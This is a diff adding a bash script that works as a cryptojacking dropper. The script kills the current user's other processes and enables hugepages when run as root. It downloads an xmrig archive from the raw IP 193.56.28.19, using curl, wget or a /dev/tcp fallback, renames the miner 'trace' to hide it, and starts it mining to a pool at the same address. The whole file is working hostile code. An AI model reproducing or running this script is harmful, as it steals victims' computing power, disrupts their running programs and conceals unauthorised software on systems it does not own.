@@ -1,0 +1,61 @@
+#!/bin/bash
+if [[ $(whoami) != "root" ]]; then
+    for tr in $(ps -U $(whoami) | egrep -v "java|ps|sh|egrep|grep|PID" | cut -b1-6); do
+        kill -9 $tr || : ;
+    done;
+else 
+    echo 128 > /proc/sys/vm/nr_hugepages;
+    sysctl -w vm.nr_hugepages=128;
+fi
+
+threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
+hostHash=$(hostname -f | md5sum | cut -c1-8);
+echo "${hostHash} - ${threadCount}";
+
+_curl () {
+  read proto server path <<<$(echo ${1//// })
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+
+  exec 3<>/dev/tcp/${HOST}/$PORT
+  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+  (while read line; do
+   [[ "$line" == $'\r' ]] && break
+  done && cat) <&3
+  exec 3>&-
+}
+
+rm -rf config.json;
+
+d () {
+	curl -L --insecure --connect-timeout 10 --max-time 55 --fail $1 -o $2 2> /dev/null || wget --no-check-certificate --timeout 55 --tries 2 $1 -O $2 2> /dev/null || _curl $1 > $2;
+}
+
+test ! -s trace && \
+    d http://193.56.28.19:52343/xmrig.tar.gz trace.tgz trace.tgz && \
+    tar -zxvf trace.tgz && \
+    mv xmrig trace && \
+    rm -rf trace.tgz;
+
+test ! -x trace && chmod +x trace;
+
+k() {
+    ./trace \
+        -r 2 \
+        -R 2 \
+        --keepalive \
+        --no-color \
+		--nicehash \
+        --donate-level 0 \
+        --cpu-priority 3 \
+        --print-time 10 \
+        --threads ${threadCount:-4} \
+        --url $1 \
+        --user P \
+        --pass X \
+        --keepalive
+}
+
+k 193.56.28.19:8080 || k 193.56.28.19:8080
